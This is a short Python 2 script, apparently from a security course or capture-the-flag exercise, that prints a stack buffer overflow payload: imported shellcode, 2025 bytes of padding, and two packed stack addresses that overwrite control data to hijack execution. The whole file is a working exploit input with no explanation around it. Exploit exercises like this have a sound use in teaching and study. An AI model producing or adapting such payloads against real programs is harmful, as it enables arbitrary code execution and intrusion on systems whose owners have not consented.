from shellcode import shellcode
from struct import pack

print shellcode + "a"*2025 + pack("<I", 0xbffef728) + pack("<I", 0xbffeff3c)